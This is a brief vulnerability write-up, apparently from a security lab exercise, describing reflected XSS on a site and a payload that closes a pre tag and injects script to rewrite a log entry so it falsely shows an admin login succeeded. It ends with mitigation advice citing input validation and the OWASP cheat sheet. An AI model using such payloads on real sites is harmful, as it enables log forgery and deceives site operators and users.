## Vulnerability:

Site is vulnerable to reflected XSS.

## Exploitation:

Injecting following Javascript code:
```
</pre><script>document.getElementsByTagName("PRE")[1].innerHTML = "Login succeeded for username: admin"</script>
```

Changes log to:
```
"Login succeeded for username: admin"
```

## Mitigation:
1) Validate input data.

2) Use as https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet as guideline to defend against XSS attacks.
